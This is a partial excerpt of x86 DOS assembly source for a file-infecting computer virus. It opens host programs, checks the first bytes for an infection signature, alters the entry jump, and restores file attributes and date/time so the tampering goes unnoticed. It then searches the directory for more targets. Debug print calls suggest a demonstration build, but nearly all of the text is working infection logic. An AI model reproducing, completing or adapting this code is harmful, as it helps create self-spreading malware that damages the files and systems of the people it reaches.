...
ret
FILE_OPENED:
mov word ptr[wHostFileHandle], ax ;save handle
xchg ax,bx   ; Move file handle to BX
STORE_FILE_DATE_TIME:
mov word ptr[wHostAttributes],cx; store them(attributes) on memory --> wHostAttributes
; SAVE date&time
lea si,sDateTime
call Printf
Mov Ax,5700h  ; save file date/time 
mov bx,word ptr[wHostFileHandle] 
xor cx,cx
xor dx,dx     
Int 21h
...
jmp CLOSE_FILE
READ_FIRST_BYTES:
mov word ptr[wHostTime],cx ;save the file time last change
mov word ptr[wHostDate],dx ;save the file date last change
; READ FIRST 5 BYTES 
lea si, sFileCheck
call Printf
mov ah,3Fh ;read dos function
mov bx, word ptr[wHostFileHandle] ; bx get the handle
mov cx,5 ;read 5 bytes from the file
mov dx,offset HostBytesOld ;address of buffer in which to read
int 21h
jnc FILE_READ_OK
jmp CLOSE_FILE
FILE_READ_OK:
lea si,sFileSignature
call Printf
xchg di, dx ;DI=buffer where data has been read
;CHECK FILE FOR PRIOR INFECTION 
mov ax,[di+3] ;get host signature
lea bx,[VirusSignature]
cmp ax, bx ;check signature
jne FILE_NOT_INFECTED
lea si,sAlreadyInfected
call Printf
jmp CLOSE_FILE
FILE_NOT_INFECTED:
...
mov word ptr[wHostFileLength], ax ;save the length of the file (minus 3)
lea si,sPointerMoved
call Printf
...
lea si,sJumpUpdated
call Printf
lea si,srestoreAttributes
call Printf
Mov Ax,4301h ; set the stored file attributes 
mov cx,word ptr[wHostAttributes]
Mov Dx,OFFSET DTA+30 ; Filename from DTA
Int 21h                             
jnc RESTORE_FILE_DATE_TIME
jmp CLOSE_FILE
RESTORE_FILE_DATE_TIME:
lea si,srestoreDateTime
call Printf
Mov Ax,5701h ; set file date/time 
mov bx,word ptr[wHostFileHandle] 
mov cx,word ptr[wHostTime]
mov dx,word ptr[wHostDate]    
Int 21h
...
iret
FINDFIRSTFILE:
mov word ptr[counter],0001h ; Initializing the counter
cmp  word ptr[ firstfile],0h ;is it the first SEARCH file ?
jne FINDNEXTTFILE
;SEARCH FIRST FILE IN CURRENT DIR
add word ptr[firstfile],1b ;for next time its will be not first file SO SAVE 1 IN MEMORY--> next file
lea si,newDTA
call Printf 
